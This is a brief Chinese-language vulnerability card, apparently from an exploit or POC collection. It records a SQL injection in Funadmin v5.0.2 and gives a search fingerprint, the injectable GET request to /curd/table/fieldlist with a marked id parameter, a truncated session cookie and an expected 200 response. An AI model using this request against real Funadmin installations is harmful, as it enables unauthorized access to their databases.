# Funadminv5.0.2fieldlist存在SQL注入漏洞

- **系统**：Funadminv5　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"FunAdmin"`
- **请求**：`GET /curd/table/fieldlist?id=fun_test* HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=84a79679dc650a2da1270dfa0aed683d; Hm_lvt_8dcaf664827c0e8ae52287ebb2411…`
- **预期**：200　|　—